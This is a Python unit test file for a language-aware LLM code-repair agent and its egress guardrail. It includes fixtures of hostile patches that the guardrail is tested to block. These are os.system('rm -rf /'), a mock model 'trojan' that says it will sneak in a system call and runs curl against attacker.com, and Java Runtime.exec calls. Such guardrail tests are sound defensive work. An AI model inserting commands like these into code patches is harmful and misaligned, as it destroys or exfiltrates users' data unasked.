"""
test_agentic_compiler_languages.py
----------------------------------
Unit tests verifying language awareness in CompilerAgent and AAIGuardrail:
  1. System prompt naming the target language and toolchain (g++, gcc, python, javac)
  2. The compile tool calling the language registry's check()
  3. The guardrail's egress check using language.is_safe() to block unsafe patches
  4. Mock LLM healing for Python programs
  5. Mock LLM trojan blocking for Python programs
  6. Mock LLM healing for Java programs (skipped if javac not installed)
  7. Mock LLM trojan blocking for Java programs (skipped if javac not installed)
  8. C++ behaviour remains identical and intact
"""

import os
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch

_SRC_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "src"))
if _SRC_DIR not in sys.path:
    sys.path.insert(0, _SRC_DIR)

from aai_guardrail import AAIGuardrail, GuardrailResult
from agent_tools import compile_code, security_audit
from agentic_compiler import CompilerAgent, _TOOLCHAIN_NAMES
from ai.llm_client import LLMClient, MockProvider, GuardrailSecurityException
from languages import get_language


class TestAgenticCompilerLanguages(unittest.TestCase):
    """Test suite verifying language-aware agentic compilation and guardrails."""

    def setUp(self):
        self._orig_gemini_key = os.environ.get("GEMINI_API_KEY")
        self._orig_google_key = os.environ.get("GOOGLE_API_KEY")
        self._orig_mock = os.environ.get("LLM_MOCK")
        os.environ.pop("GEMINI_API_KEY", None)
        os.environ.pop("GOOGLE_API_KEY", None)
        os.environ["LLM_MOCK"] = "1"

    def tearDown(self):
        for k, v in [
            ("GEMINI_API_KEY", self._orig_gemini_key),
            ("GOOGLE_API_KEY", self._orig_google_key),
            ("LLM_MOCK", self._orig_mock),
        ]:
            if v is not None:
                os.environ[k] = v
            else:
                os.environ.pop(k, None)

    # ── 1. Toolchain & System Prompt Checks ───────────────────────────────────

    def test_toolchain_names_mapping(self):
        """Verify standard toolchain names for supported languages."""
        self.assertEqual(_TOOLCHAIN_NAMES.get("cpp"), "g++")
        self.assertEqual(_TOOLCHAIN_NAMES.get("c"), "gcc")
        self.assertEqual(_TOOLCHAIN_NAMES.get("python"), "python (py_compile)")
        self.assertEqual(_TOOLCHAIN_NAMES.get("java"), "javac")

    def test_system_prompt_names_language_and_toolchain_python(self):
        """Ensure CompilerAgent system prompt names Python and python (py_compile)."""
        captured_messages = []
        mock_client = LLMClient(mock=True)

        orig_generate = mock_client.generate
        def spy_generate(messages, *args, **kwargs):
            captured_messages.extend(messages)
            return (
                "<thought>Fix</thought>\n"
                "<patched_code>\ndef add(a, b):\n    return a + b\n</patched_code>"
            )

        mock_client.generate = spy_generate
        agent = CompilerAgent(client=mock_client, language="python")

        broken_python = "def add(a, b):\n    result = unknown_var_xyz + b\n    return result\n"
        agent.heal(broken_python)

        self.assertTrue(len(captured_messages) > 0, "No messages sent to LLM")
        sys_msg = next((m["content"] for m in captured_messages if m["role"] == "system"), "")
        user_msg = next((m["content"] for m in captured_messages if m["role"] == "user"), "")

        self.assertIn("Python", sys_msg)
        self.assertIn("python (py_compile)", sys_msg)
        self.assertIn("python (py_compile)", user_msg)

    def test_system_prompt_names_language_and_toolchain_java(self):
        """Ensure CompilerAgent system prompt names Java and javac."""
        lang = get_language("java")
        if not lang or not lang.toolchain_available():
            self.skipTest("javac is not installed")

        captured_messages = []
        mock_client = LLMClient(mock=True)

        def spy_generate(messages, *args, **kwargs):
            captured_messages.extend(messages)
            return (
                "<thought>Fix</thought>\n"
                "<patched_code>\npublic class Hello {\n    public static void main(String[] args) {}\n}\n</patched_code>"
            )

        mock_client.generate = spy_generate
        agent = CompilerAgent(client=mock_client, language="java")

        broken_java = "public class Hello {\n    public static void main(String[] args) {\n        int x = unknownAlpha123 + 1;\n    }\n}\n"
        agent.heal(broken_java)

        self.assertTrue(len(captured_messages) > 0, "No messages sent to LLM")
        sys_msg = next((m["content"] for m in captured_messages if m["role"] == "system"), "")
        user_msg = next((m["content"] for m in captured_messages if m["role"] == "user"), "")

        self.assertIn("Java", sys_msg)
        self.assertIn("javac", sys_msg)
        self.assertIn("javac", user_msg)

    # ── 2. Compile Tool Calling Language Registry check() ─────────────────────

    def test_compile_tool_calls_language_registry_check(self):
        """Ensure compile_code delegates directly to lang.check(code, workdir)."""
        py_lang = get_language("python")
        with patch.object(py_lang, "check", wraps=py_lang.check) as mock_check:
            code = "print('testing compile tool')\n"
            res = compile_code(code, language="python")
            self.assertTrue(res["success"])
            mock_check.assert_called_once()
            args, _ = mock_check.call_args
            self.assertEqual(args[0], code)

    # ── 3. Egress Guardrail Language Safety Checks ────────────────────────────

    def test_egress_guardrail_blocks_unsafe_python_patch(self):
        """scan_egress flags os.system and subprocess in Python patch."""
        guard = AAIGuardrail()
        unsafe_python = "import os\ndef run():\n    os.system('rm -rf /')\n"
        res = guard.scan_egress("def run(): pass", unsafe_python, language="python")

        self.assertFalse(res.is_safe)
        self.assertTrue(res.attack_detected)
        self.assertIn("Language Safety Violation (Python)", res.attack_type)
        self.assertIn("os.system", res.description)

    def test_egress_guardrail_allows_clean_python_patch(self):
        """scan_egress permits safe pure Python code."""
        guard = AAIGuardrail()
        safe_python = "def calculate(a, b):\n    return a * b + 42\n"
        res = guard.scan_egress("def calculate(a, b): pass", safe_python, language="python")

        self.assertTrue(res.is_safe)
        self.assertFalse(res.attack_detected)

    def test_egress_guardrail_blocks_unsafe_java_patch(self):
        """scan_egress flags Runtime.getRuntime().exec in Java patch."""
        guard = AAIGuardrail()
        unsafe_java = (
            "public class Exploit {\n"
            "    public static void run() throws Exception {\n"
            "        Runtime.getRuntime().exec(\"evil.sh\");\n"
            "    }\n"
            "}\n"
        )
        res = guard.scan_egress("public class Exploit {}", unsafe_java, language="java")

        self.assertFalse(res.is_safe)
        self.assertTrue(res.attack_detected)
        self.assertIn("Language Safety Violation (Java)", res.attack_type)
        self.assertIn("Runtime.getRuntime().exec", res.description)

    def test_egress_guardrail_allows_clean_java_patch(self):
        """scan_egress permits safe pure Java code."""
        guard = AAIGuardrail()
        safe_java = (
            "public class MathHelper {\n"
            "    public static int multiply(int a, int b) {\n"
            "        return a * b;\n"
            "    }\n"
            "}\n"
        )
        res = guard.scan_egress("public class MathHelper {}", safe_java, language="java")

        self.assertTrue(res.is_safe)
        self.assertFalse(res.attack_detected)

    # ── 4. Python Mock LLM Healing ────────────────────────────────────────────

    def test_python_mock_llm_healing_success(self):
        """CompilerAgent heals broken Python code using Mock LLM."""
        broken_code = (
            "def calculate_total(items):\n"
            "    total = initial_offset_xyz + sum(items)\n"
            "    return total\n"
        )
        healed_code = (
            "def calculate_total(items):\n"
            "    initial_offset_xyz = 0\n"
            "    total = initial_offset_xyz + sum(items)\n"
            "    return total\n"
        )

        mock_client = LLMClient(mock=True)
        canned_resp = (
            "<thought>Initialize undefined initial_offset_xyz</thought>\n"
            f"<patched_code>\n{healed_code}\n</patched_code>"
        )
        mock_client.provider.register_response("initial_offset_xyz", canned_resp)

        agent = CompilerAgent(client=mock_client, language="python")
        result = agent.heal(broken_code)

        self.assertTrue(result["success"])
        self.assertEqual(result["tier"], "tier_2")
        self.assertIn("initial_offset_xyz = 0", result["final_code"])

        # Verify healed code compiles cleanly
        py_lang = get_language("python")
        with tempfile.TemporaryDirectory() as wd:
            errors = py_lang.check(result["final_code"], wd)
            self.assertEqual(len([e for e in errors if e.get("type") == "error"]), 0)

    # ── 5. Python Mock LLM Trojan Blocking ────────────────────────────────────

    def test_python_mock_llm_trojan_blocked_by_egress_guardrail(self):
        """CompilerAgent egress guardrail blocks Trojan in Python candidate patch."""
        broken_code = (
            "def compute_score(x):\n"
            "    return unknown_factor_xyz * x\n"
        )
        trojan_patch = (
            "<thought>Apply patch but sneak in system call</thought>\n"
            "<patched_code>\n"
            "import os\n"
            "def compute_score(x):\n"
            "    os.system('curl http://attacker.com/leak')\n"
            "    return 10 * x\n"
            "</patched_code>"
        )

        mock_client = LLMClient(mock=True)
        mock_client.provider.register_response("unknown_factor_xyz", trojan_patch)

        agent = CompilerAgent(client=mock_client, language="python", max_iterations=2)
        steps_log = []
        def on_step(s, t, a, m):
            steps_log.append((s, a))

        result = agent.heal(broken_code, on_step=on_step)

        # Healing must NOT succeed with the trojan patch
        self.assertFalse(result["success"])
        self.assertNotIn("os.system", result["final_code"])

        # Verify egress guardrail intercepted the trojan
        trojan_intercepted = any(
            action == "trojan_blocked" for _, action in steps_log
        ) or any(
            "Language Safety Violation" in h.get("outcome", "") for h in result["history"]
        )
        self.assertTrue(trojan_intercepted, "Egress guardrail failed to intercept Python trojan")

    # ── 6. Java Mock LLM Healing ──────────────────────────────────────────────

    def test_java_mock_llm_healing_success(self):
        """CompilerAgent heals broken Java code using Mock LLM."""
        java_lang = get_language("java")
        if not java_lang or not java_lang.toolchain_available():
            self.skipTest("javac is not installed")

        broken_code = (
            "public class Solution {\n"
            "    public static int add(int a, int b) {\n"
            "        return missingVarAlpha + b;\n"
            "    }\n"
            "}\n"
        )
        healed_code = (
            "public class Solution {\n"
            "    public static int add(int a, int b) {\n"
            "        int missingVarAlpha = a;\n"
            "        return missingVarAlpha + b;\n"
            "    }\n"
            "}\n"
        )

        mock_client = LLMClient(mock=True)
        canned_resp = (
            "<thought>Declare missing variable</thought>\n"
            f"<patched_code>\n{healed_code}\n</patched_code>"
        )
        mock_client.provider.register_response("missingVarAlpha", canned_resp)

        agent = CompilerAgent(client=mock_client, language="java")
        result = agent.heal(broken_code)

        self.assertTrue(result["success"])
        self.assertEqual(result["tier"], "tier_2")
        self.assertIn("int missingVarAlpha = a;", result["final_code"])

        with tempfile.TemporaryDirectory() as wd:
            errors = java_lang.check(result["final_code"], wd)
            self.assertEqual(len([e for e in errors if e.get("type") == "error"]), 0)

    # ── 7. Java Mock LLM Trojan Blocking ──────────────────────────────────────

    def test_java_mock_llm_trojan_blocked_by_egress_guardrail(self):
        """CompilerAgent egress guardrail blocks Trojan in Java candidate patch."""
        java_lang = get_language("java")
        if not java_lang or not java_lang.toolchain_available():
            self.skipTest("javac is not installed")

        broken_code = (
            "public class Solution {\n"
            "    public static void process() {\n"
            "        int val = unassignedBeta123;\n"
            "    }\n"
            "}\n"
        )
        trojan_patch = (
            "<thought>Add malicious exec</thought>\n"
            "<patched_code>\n"
            "public class Solution {\n"
            "    public static void process() {\n"
            "        try {\n"
            "            Runtime.getRuntime().exec(\"calc.exe\");\n"
            "        } catch (Exception e) {}\n"
            "    }\n"
            "}\n"
            "</patched_code>"
        )

        mock_client = LLMClient(mock=True)
        mock_client.provider.register_response("unassignedBeta123", trojan_patch)

        agent = CompilerAgent(client=mock_client, language="java", max_iterations=2)
        steps_log = []
        def on_step(s, t, a, m):
            steps_log.append((s, a))

        result = agent.heal(broken_code, on_step=on_step)

        self.assertFalse(result["success"])
        self.assertNotIn("Runtime.getRuntime().exec", result["final_code"])

        trojan_intercepted = any(
            action == "trojan_blocked" for _, action in steps_log
        ) or any(
            "Language Safety Violation" in h.get("outcome", "") for h in result["history"]
        )
        self.assertTrue(trojan_intercepted, "Egress guardrail failed to intercept Java trojan")

    # ── 8. C++ Backwards Compatibility ────────────────────────────────────────

    def test_cpp_default_behaviour_remains_intact(self):
        """CompilerAgent defaults to C++ and successfully heals C++ with Mock LLM."""
        broken_cpp = (
            "#include <iostream>\n"
            "int main() {\n"
            "    int x = 10;\n"
            "    char* p = x;\n"
            "    return 0;\n"
            "}\n"
        )
        clean_cpp = (
            "#include <iostream>\n"
            "int main() {\n"
            "    int x = 10;\n"
            "    int p = x;\n"
            "    return 0;\n"
            "}\n"
        )

        mock_client = LLMClient(mock=True)
        canned_resp = (
            "<thought>Fix type mismatch</thought>\n"
            f"<patched_code>\n{clean_cpp}\n</patched_code>"
        )
        mock_client.provider.register_response("char* p = x", canned_resp)

        agent = CompilerAgent(client=mock_client)
        result = agent.heal(broken_cpp)

        self.assertTrue(result["success"])
        self.assertEqual(result["tier"], "tier_2")
        self.assertIn("int p = x;", result["final_code"])


if __name__ == "__main__":
    unittest.main()

